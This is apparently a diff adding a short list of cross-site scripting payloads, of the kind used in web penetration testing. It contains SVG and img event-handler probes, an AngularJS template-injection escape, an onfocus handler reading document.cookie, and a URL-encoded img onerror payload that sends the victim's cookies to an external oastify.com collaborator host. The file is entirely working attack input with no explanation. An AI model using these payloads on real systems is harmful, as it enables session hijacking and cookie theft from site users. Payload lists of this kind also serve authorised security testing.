@@ -1,0 +1,6 @@
+<svg onload=alert()>
+<img src=x onerror=alert(1)>
+<img src=1 oNeRrOr=alert`1`>
+<img+src%3dx+onerror%3dthis.src%3d'http://1qsd6gspmvyvulcfpv5gfl7vmmsdg84x.oastify.com%3fc%3d'%2bdocument.cookie>
+{{$on.constructor('alert(1)')()}}
+<kebby onfocus=”alert(document.cookie)” id=”x” tabindex=”1”>
